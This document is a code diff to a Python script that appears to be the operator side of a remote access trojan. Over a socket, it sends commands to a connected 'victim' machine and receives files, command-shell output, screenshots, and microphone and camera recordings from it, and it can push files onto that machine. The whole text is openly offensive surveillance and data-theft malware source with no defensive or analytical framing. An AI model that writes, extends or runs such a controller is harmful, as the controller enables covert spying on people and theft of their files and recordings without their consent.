@@ -1,6 +1,4 @@
 import socket
-import goto
-
 
 s = socket.socket()
 s.bind(('127.0.0.1', 7613))
@@ -8,14 +6,13 @@ s.listen(1)
 server_socket, adress = s.accept()
 
 
-def receive_file_from_client(bool):
-    #if (x == True):
+def receive_file_from_client(x):
+    if x:
+        file_path = "C:\\C projects\\CMD_Text.txt"
 
-
-
-
-    # Take from the victim file
-    file_path = input("Where do you want save the file?\n")
+    else:
+        # Take from the victim file
+        file_path = input("Where do you want save the file?\n")
 
     with open(file_path, 'wb')as f:
         print('Open File')
@@ -52,11 +49,17 @@ def server():
         server_socket.send(command.encode('utf-8'))
 
         if command.startswith('get file '):
-            receive_file_from_client()
+            receive_file_from_client(False)
 
 
         elif command.startswith("cmd"):
-            receive_file_from_client()
+            receive_file_from_client(True)
+            file_content = ''
+            with open("C:\\C projects\\CMD_Text.txt") as file:
+                for line in file.readlines():
+                    file_content += line
+            print(file_content)
+
 
 
         elif command.startswith('download file '):
@@ -73,23 +76,23 @@ def server():
             server_socket.sendall(command.encode('utf-8'))
             path = input("Where do you want save the file on victim computer\n")
             server_socket.sendall(path.encode('utf-8'))
-            receive_file_from_client()
+            receive_file_from_client(False)
 
         elif command.startswith('take screenshot '):
-            receive_file_from_client()
+            receive_file_from_client(False)
 
 
         elif command == 'exit':
             break
 
         elif command.startswith('listen'):
-            receive_file_from_client()
+            receive_file_from_client(False)
 
         elif command.startswith('take mic output'):
-            receive_file_from_client()
+            receive_file_from_client(False)
 
         elif command.startswith("take camera video"):
-            receive_file_from_client()
+            receive_file_from_client(False)
 
         else:
             data = server_socket.recv(1024).decode('utf-8')
